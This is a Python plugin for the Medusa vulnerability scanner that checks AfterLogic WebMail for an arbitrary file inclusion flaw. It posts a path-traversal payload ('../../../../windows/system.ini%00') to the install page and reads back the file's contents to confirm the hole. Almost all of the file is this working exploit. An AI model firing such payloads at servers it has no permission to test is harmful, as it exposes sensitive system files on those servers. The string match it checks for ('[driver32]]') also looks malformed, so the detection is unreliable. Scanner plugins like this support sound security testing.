#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
from ClassCongregation import VulnerabilityDetails,WriteFile,ErrorLog,ErrorHandling
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" 
        self.info['author'] = "Trans"  # 插件作者
        self.info['create_date']  = "2020-1-18"  # 插件编辑时间
        self.info['disclosure']='2015-11-25'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "AfterLogicWebMailArbitraryFileContains"  # 插件名称
        self.info['name'] ='AfterLogicWebMail任意文件包含' #漏洞名称
        self.info['affects'] = "AfterLogicWebMail"  # 漏洞组件
        self.info['desc_content'] = "AfterLogicWebMail任意文件包含漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "无"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def medusa(**kwargs)->None:
    url = kwargs.get("Url")  # 获取传入的url参数
    Headers = kwargs.get("Headers")  # 获取传入的头文件
    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
    try:
        payload = "/install/index.php?post=1"
        payload_url = url+ payload
        data={"state": "../../../../../../../../../../windows/system.ini%00"}
        resp = requests.post(payload_url,data=data,headers=Headers, proxies=proxies,timeout=6, verify=False)
        con = resp.text
        code = resp.status_code
        if code == 200 and con.find('[driver32]]') !=-1 :
            Medusa = "{}存在AfterLogic_WebMail任意文件包含漏洞\r\n漏洞地址:{}\r\n漏洞详情:{}\r\n".format(url,payload_url,con)
            _t=VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, resp, **kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类